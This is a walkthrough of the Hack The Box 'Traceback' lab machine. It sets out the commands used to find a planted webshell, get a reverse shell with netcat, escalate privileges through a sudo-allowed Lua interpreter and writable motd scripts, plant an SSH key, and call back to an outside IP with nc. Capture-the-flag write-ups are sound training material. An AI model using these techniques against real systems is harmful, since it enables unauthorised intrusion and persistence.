Let's attempt doing another HTB machine.

	
	kali@kali:~$ nmap -sV -T4 10.10.10.181

It looks like we've only got two open ports. The website seems to have been taken over. The site says: 

	
	This site has been owned
	I have left a backdoor for all the net. FREE INTERNETZZZ
	- Xh4H -

A comment on the code says 'Some of the best webshells you might need ;)'

I tried bruteforcing ssh, but that didn't do much. I googled the phrase on the comment and found a github repo with web shells.

	https://github.com/Xh4H/Web-Shells

Let's try fuzzing the website, maybe one of the shells is in the server.
	
	ffuf -w ../CTF/HTB/Machines/Traceback/webshells.txt -u http://10.10.10.181/FUZZ

	smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]

Gotcha!

If we go to http://10.10.10.181/smwvk.php we will get a login screen.

We have no creds. Let's check out the shell's source code for clues.

	//Make your setting here.
	$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
	$UserName = "admin";                                      //Your UserName here.
	$auth_pass = "admin";                                  //Your Password.
	//Change Shell Theme here//
	$color = "#8B008B";                                   //Fonts color modify here.
	$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
	$TabsColor = '#0E5061';                              //Change tabs color here.
	#-------------------------------------------------------------------------------

It seems like the default user and password are admin. Let's try using those.

Aha! We're in.

I wanted to upload a reverse shell to the server to feel a bit more confortable. Let's set up a listener and request it with curl.

	Terminal 1:
	nc -lvnp 1234
	Terminal 2:
	curl 10.10.10.181/php-reverse-shell.phtml

We find a note on /home/webadmin/

	cat note.txt 
	- sysadmin -
	I have left a tool to practice Lua.
	I'm sure you know where to find it.
	Contact me if you have any question.

If we run sudo -l we get the following output:

	webadmin@traceback:/home$ sudo -l
	sudo -l
	Matching Defaults entries for webadmin on traceback:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User webadmin may run the following commands on traceback:
	    (sysadmin) NOPASSWD: /home/sysadmin/luvit
	webadmin@traceback:/home$ 

It seems like we can run the following command to run luvit as sysadmin:
	
	sudo -u sysadmin /home/sysadmin/luvit
	
I failed several attempts but I was on the correct path. All we have to do is make a lua executable and run it to get a shell with sudo privileges.

	#Create the privesc file.
	echo 'os.execute("/bin/sh")' > privesc.lua

	#Run
	sudo -u sysadmin /home/sysadmin/luvit privesc.lua

	#Get a proper shell.
	python3 -c 'import pty; pty.spawn("/bin/bash")'

The user flag is on the home folder.

Time to privesc. Let's use the linpeas script file.

We'll setup a webserver on the linpeas directory.

	python3 -m http.server 80 

On the the Traceback machine, let's do:
	
	wget <yourIP>/linpeas.sh

Make linpeas.sh executable and run it.

	chmod +x linpeas.sh
	./linpeas.sh

We might have found a privilege escalation vector.

	[+] Interesting GROUP writable files (not in Home) (max 500)
	[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
	  Group sysadmin:
	/etc/update-motd.d/50-motd-news --
	/etc/update-motd.d/10-help-text --
	/etc/update-motd.d/91-release-upgrade --
	/etc/update-motd.d/00-header --
	/etc/update-motd.d/80-esm --
	/home/webadmin/note.txt --

There seems to be a cron job running that executes these scripts.

	root      38116  0.0  0.0   4628   780 ?        Ss   17:11   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

Okay, something I did not know. motd are scripts that wun everytime a user is logged in, which means that if I login through ssh the scripts on the update-motd.d directory will be executed. SSH is running on an open port 22. So that might be the way to go. 

After struggling for some time with this part I found out I had the right mindset but not the right knowledge.

A little earlier I found the .ssh folder on webadmin's home directory. I thought authorized_keys was a standard file and couldn't really use it for anything. I was wrong. I can copy my own public key and use it to connect to Traceback through ssh. I think this is some pretty basic ssh knowledge, and it totally went over my head.

All I need to do is insert my public key in the authorized_keys file.

	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrq1BbyI20bfN5S0LRwtdh/0pGAmRMorkTsCDifn9k08ckgGUW8smTApjEQQ5vrxWXOhsDWZhfjEXCuVCPMC3Wp5IVNgaJOGqVwqh4bZhWkc5hgEKb4avFC3Wv8nKRQOIF+Z0y/vAXo4WgOVEwmKHihbbtzmAkWFQQGch+Z30lamzvY1tOkmsIuAEkLQ+1+aGXWQT/CAHbeRnA+c4qv9HJHoJb681WutEWO2Hh7y0+dPqxWE152eHifl5oMlI5gvg9ZLENfpHeLg4btJz+RDhIkuUSPJIy/Ad3X+KamM6HGph8kuhjN4DqXd3nB9DX+mQJyeqD03ZvmTuEIqPYuKvx1Y+aXSJPZ+/d8sshyWzK5jFvZ19jTZnD1g0/ymKgUSuZmo3mR8qBYTsJLrobUaZkLI8EIcec7LvxHO2ocfV8teRY0S0+OnZTSmAVRCr9mNlnZLioOU34YHAU4IskQgkfqY9htkcn1VcALizlmudYMAiej4l6P2uJhIfBTVIGgBU= kali@kali" >> /home/sysadmin/.ssh/authorized_keys

And with this I require no password to login.
So I guess that the following message means that either a publickey or a password is required to login.
	
	sysadmin@10.10.10.181: Permission denied (publickey,password).

Now, all I have to do is to modify any script on the update-motd.d directory to access the root flag and login through SSH.  

	echo "cat /root/root.txt" > 10-help-text

Oops, that didn't work. I think i have to append the command instead of overwriting the file.

	echo "cat /root/root.txt" >> 10-help-text

Let's try logging in through SSH.

	kali@kali:~$ ssh sysadmin@10.10.10.181

There we go! We got the root flag.


Some other guy suggests a reverse shell is possible using the same method, which is something I was attempting to do like this: 

	echo "nc 10.10.14.214 4444" >> 10-help-text

That didn't work,though. I might have used the command the wrong way, or perhaps the box has a different nc version.
